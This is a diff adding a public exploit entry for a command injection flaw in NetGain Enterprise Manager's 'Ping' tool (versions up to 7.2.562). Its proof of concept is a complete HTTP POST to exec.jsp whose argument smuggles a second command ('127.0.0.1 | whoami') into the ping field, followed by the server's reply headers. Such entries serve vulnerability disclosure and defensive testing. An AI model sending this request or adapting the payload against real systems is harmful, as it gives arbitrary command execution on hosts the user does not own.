@@ -1,0 +1,43 @@
+# Exploit Title: NetGain Enterprise Manager – “Ping” Command Injection
+# Date: 23.02.2017
+# Exploit Author: MrChaZ
+# Vendor Homepage: http://www.netgain-systems.com/
+# Version: <= v7.2.562 build 853
+# Tested on: Windows 10 Pro 64-bit (10,0 Build 14393
+
+
+Description:
+===========================================================================
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
+
+https://www.owasp.org/index.php/Command_Injection
+
+Vulnerable Menu:
+===========================================================================
+[+] Tools – Ping
+
+Proof of Concept:
+===========================================================================
+POST /u/jsp/tools/exec.jsp HTTP/1.1
+Host: 192.168.0.13:8081
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.0.13:8081/u/index.jsp
+Content-Length: 97
+Cookie: JSESSIONID=542B58462355E4E3B99FAA42842E62FF
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+
+command=cmd+%2Fc+ping&argument=127.0.0.1+%7C+whoami&async_output=ping1487856455258&isWindows=true
+-
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=utf-8
+Content-Length: 70
+Date: Thu, 23 Feb 2017 13:27:40 GMT
+Connection: close
